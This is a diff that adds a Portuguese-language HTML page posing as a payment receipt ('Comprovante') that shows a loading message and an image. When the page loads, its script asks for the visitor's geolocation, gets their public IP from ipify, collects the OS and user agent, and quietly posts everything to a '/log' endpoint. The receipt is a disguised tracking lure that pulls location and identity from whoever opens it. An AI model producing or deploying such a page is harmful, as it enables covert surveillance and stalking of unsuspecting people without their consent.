@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Comprovante</title>
+</head>
+<body>
+  <h2>Carregando comprovante...</h2>
+  <img src="comprovante-exemplo.jpg" alt="Comprovante" style="max-width: 100%;">
+
+  <script>
+    async function getOS() {
+      let userAgent = navigator.userAgent;
+      if (userAgent.includes("Win")) return "Windows";
+      if (userAgent.includes("Mac")) return "MacOS";
+      if (userAgent.includes("Linux")) return "Linux";
+      if (/Android/.test(userAgent)) return "Android";
+      if (/iPhone|iPad/.test(userAgent)) return "iOS";
+      return "Desconhecido";
+    }
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "IP não encontrado";
+      }
+    }
+
+    async function sendLog(latitude, longitude) {
+      const ip = await getIP();
+      const os = await getOS();
+      const userAgent = navigator.userAgent;
+
+      fetch('/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip, os, userAgent, latitude, longitude })
+      });
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const { latitude, longitude } = pos.coords;
+        sendLog(latitude, longitude);
+      },
+      (err) => {
+        sendLog(null, null);
+      }
+    );
+  </script>
+</body>
+</html>
